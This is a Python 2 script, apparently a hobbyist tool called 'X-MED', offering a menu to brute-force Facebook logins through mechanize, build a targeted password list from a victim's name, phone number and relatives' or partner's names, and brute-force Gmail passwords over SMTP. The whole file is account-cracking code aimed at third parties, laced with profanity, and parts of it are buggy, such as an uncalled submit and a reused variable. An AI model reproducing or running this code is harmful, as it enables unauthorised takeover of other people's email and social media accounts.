import sys
from platform import system
#thnx for watching motherfuck -_-
W="\033[0m"
R="\033[91m"
G="\033[92m"
Y="\033[93m"
B="\033[94m"
RS="\033[95m"
print R+" created: "+G+"by lassoued / "+R+ "email:" +G+" mlassoued95@gmail.com"
print Y+ '''          ._________________.
          | _______________ |
          | I             I |
          | I             I |
          | I             I |
          | I             I |
          | I_____________I |
          !_________________!
             ._[_______]_.
         .___|___________|___.
         |::: ____           |
         |    ~~~~ [X-MED]   |
         !___________________! '''
print R+"                 x-med"
print RS+"[1]"+B+' brute fb '
print RS+"[2]"+B+" goodlist"
print RS+"[3]"+B+" brute gmail"
print RS+"[4]"+B+" quit"
from mechanize import Browser
option = input('x-med===> '+R)
if option == 1:
	email=raw_input(G+("Email or Phone : "))
	passw=raw_input(("passlist path : ")+G) 
	total = open(passw,"r")
	total = total.readlines()
	print B+"   [*] Account to crack : {}". format(email)
	print B+"   [*] Loaded :" ,len(total), "passwords"
	print B+"   [*] Cracking, please wait ...\n\n"+G
if option == 2:
	a = raw_input ("name: ")
	b = raw_input ("prenom: ")
	x = raw_input ("numero: ")
	y = raw_input ("name of crush/bf/sister or brother ....... : ")
	v=open('xc/text.txt','w')
	v.write(a)
	v.write(a+("123"))
	v.write(a+("321"))
	print (a+b)
	print b+("123")
	print b+("321")
	print x
	print b+a
	print a+x
	print b+x
	print y+a	
	print a+y
	print y+("123")
	print y+("321")
	print y
	print a+("2003")
	print a+("2004")
	print a+("2005")
	print a+("2006")
	print a+("2007")
	print a+("2008")
	print a+("2009")
	print a+("2010")
	print a+("2011")
	print a+("2013")
	print a+("2012")
	print a+("2014")
	print a+("2016")
	print a+("2017")
	print a+("2018")
	print a+("2019")
	print a+("2003")
	print a+("2004")
	print a+("2005")
	print a+("2006")
	print a+("2007")
	print a+("2008")
	print a+("2009")
	print a+("2010")
	print a+("2011")
	print a+("2013")
	print a+("2012")
	print a+("2014")
	print a+("2016")
	print a+("2017")
	print a+("2018")
	print a+("2019")
	print b+("2003")
	print b+("2004")
	print b+("2005")
	print b+("2006")
	print b+("2007")
	print b+("2008")
	print b+("2009")
	print b+("2010")
	print b+("2011")
	print b+("2013")
	print b+("2012")
	print b+("2014")
	print b+("2016")
	print b+("2017")
	print b+("2018")
	print b+("2019")
	print y+("2003")
	print y+("2004")
	print y+("2005")
	print y+("2006")
	print y+("2007")
	print y+("2008")
	print y+("2009")
	print y+("2010")
	print y+("2011")
	print y+("2013")
	print y+("2012")
	print y+("2014")
	print y+("2016")
	print y+("2017")
	print y+("2018")
	print y+("2019")
	for z in range (1,101):
		print a+str(z)
        print b+str(z)
        print y+str(z)
        v.close()
	print RS+"copie the list and coller in a ficher txt"+B
from smtplib import SMTP_SSL,SMTPAuthenticationError
server=SMTP_SSL("smtp.gmail.com",465)
server.ehlo()

from os import system
if option == 3:
	email=raw_input(W+'target gmail :'+G)
	file_path=raw_input(W+'path of passwords file :'+G)
	passlist=open(file_path,'r').readlines()
	print W+" number of passwords : "+B+str(len(passlist))+W
	i=0
	for pw in passlist:
		i+=1
		try:
			server.login(email,pw)
			system('clear')
			print W+"password has been hacked :"+G+pw
			print "\n^_^"
			break
		except SMTPAuthenticationError as e:
			if "534" in str(e):
				system('clear')
				print W+"password has been hacked :"+G+pw
				print "\n^_^"
				break
			else:
				print Y+str(i*100/len(passlist))+"%"+W+"/ password not found :"+R+pw

server.close()
import sys
if option == 4:
	print G+'good bay mother fuck'+B
	exit()
b=Browser()
b.set_handle_robots(False)
b.addheaders=[("User-agent","Mozilla/3.0")]
for x in total:
	b.open("https://en-gb.facebook.com/login/")
	b.select_form(nr=0)
	b.form["email"]=email
	b.form["pass"]=x
	b.submit 
	if b.title =="Facebook":
		print B+"password found : "+RS+x
		break;
	else:
		print RS+"trying : "+R+x
